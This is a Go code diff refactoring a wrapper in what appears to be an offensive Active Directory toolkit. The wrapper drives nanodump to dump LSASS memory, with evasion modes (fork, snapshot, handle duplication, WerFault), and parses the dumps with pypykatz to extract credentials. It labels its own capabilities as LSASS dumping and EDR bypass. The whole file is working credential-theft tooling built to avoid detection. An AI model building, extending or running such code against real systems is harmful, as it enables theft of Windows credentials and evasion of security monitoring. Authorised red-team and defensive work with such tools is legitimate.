@@ -2,6 +2,7 @@ package tools
 
 import (
 	"adpack/utils"
+	"context"
 	"fmt"
 	"os"
 	"path/filepath"
@@ -15,11 +16,11 @@ func (nanodumpTool) Name() string    { return "nanodump" }
 func (nanodumpTool) Available() bool { return utils.ToolAvailable("nanodump") }
 
 type NanodumpConfig struct {
-	Binary string
-	Output string
-	Fork   bool
+	Binary   string
+	Output   string
+	Fork     bool
 	Snapshot bool
-	Dup    bool
+	Dup      bool
 	Werfault bool
 }
 
@@ -30,41 +31,88 @@ func DefaultNanodumpConfig() NanodumpConfig {
 	}
 }
 
-func (n nanodumpTool) Run(cfg NanodumpConfig) utils.CmdResult {
+func (n nanodumpTool) Run(ctx context.Context, req ExecutionRequest) (*ExecutionResult, error) {
 	args := []string{}
-	if cfg.Output != "" {
-		args = append(args, "--write", cfg.Output)
-	}
-	if cfg.Fork {
+	if req.Evasion == "fork" {
 		args = append(args, "--fork")
 	}
-	if cfg.Snapshot {
+	if req.Evasion == "snapshot" {
 		args = append(args, "--snapshot")
 	}
-	if cfg.Dup {
+	if req.Evasion == "dup" {
 		args = append(args, "--dup")
 	}
-	if cfg.Werfault {
+	if req.Evasion == "werfault" {
 		args = append(args, "--werfault")
 	}
-	return utils.RunCommand(cfg.Binary, args...)
+	args = append(args, req.Args...)
+	cr := utils.RunCommandCtx(ctx, "nanodump", args)
+	if !cr.Success {
+		return cmdResultToExecResult(cr), &ToolError{
+			Tool: "nanodump", Op: "Run",
+			Err:      fmt.Errorf("exit code %d: %s", cr.ExitCode, cr.Stderr),
+			ExitCode: cr.ExitCode,
+		}
+	}
+	return cmdResultToExecResult(cr), nil
 }
 
-func (n nanodumpTool) DumpToFile(path string) utils.CmdResult {
-	return n.Run(NanodumpConfig{Binary: "nanodump", Output: path, Fork: true})
+func (n nanodumpTool) DumpToFile(ctx context.Context, path string) (*ExecutionResult, error) {
+	return n.Run(ctx, ExecutionRequest{
+		Evasion: "fork",
+		Args:    []string{"--write", path},
+	})
 }
 
-func (n nanodumpTool) ParseDump(dmpPath string) (string, error) {
+func (n nanodumpTool) ParseDump(ctx context.Context, dmpPath string) (*ExecutionResult, error) {
 	absPath, err := filepath.Abs(dmpPath)
 	if err != nil {
-		return "", fmt.Errorf("nanodump: resolving dump path: %w", err)
+		return nil, &ToolError{
+			Tool: "nanodump", Op: "ParseDump",
+			Err: fmt.Errorf("resolving dump path: %w", err),
+		}
 	}
 	if _, err := os.Stat(absPath); os.IsNotExist(err) {
-		return "", fmt.Errorf("nanodump: dump not found: %s", absPath)
+		return nil, &ToolError{
+			Tool: "nanodump", Op: "ParseDump",
+			Err: fmt.Errorf("dump not found: %s", absPath),
+		}
 	}
-	r := utils.RunCommand("pypykatz", "lsa", "minidump", absPath)
-	if !r.Success {
-		return "", fmt.Errorf("nanodump: pypykatz parse failed: %s", r.Stderr)
+	cr := utils.RunCommandCtx(ctx, "pypykatz", []string{"lsa", "minidump", absPath})
+	if !cr.Success {
+		return cmdResultToExecResult(cr), &ToolError{
+			Tool: "nanodump", Op: "ParseDump",
+			Err:      fmt.Errorf("pypykatz parse failed: %s", cr.Stderr),
+			ExitCode: cr.ExitCode,
+		}
 	}
-	return r.Stdout, nil
+	return cmdResultToExecResult(cr), nil
+}
+
+func (n nanodumpTool) Validate() error {
+	if !n.Available() {
+		return &ToolError{
+			Tool: "nanodump", Op: "Validate",
+			Err: fmt.Errorf("nanodump not found in PATH"),
+		}
+	}
+	return nil
+}
+
+func (n nanodumpTool) Capabilities() []Capability {
+	return []Capability{CapLSASSDump, CapEDRBypass}
+}
+
+func (n nanodumpTool) RunStream(ctx context.Context, req ExecutionRequest) (<-chan ExecutionEvent, error) {
+	ch := make(chan ExecutionEvent, 1)
+	go func() {
+		defer close(ch)
+		result, err := n.Run(ctx, req)
+		if err != nil {
+			ch <- ExecutionEvent{Type: "error", Status: StatusFailed, Error: err}
+			return
+		}
+		ch <- ExecutionEvent{Type: "complete", Status: StatusSuccess, Result: result}
+	}()
+	return ch, nil
 }
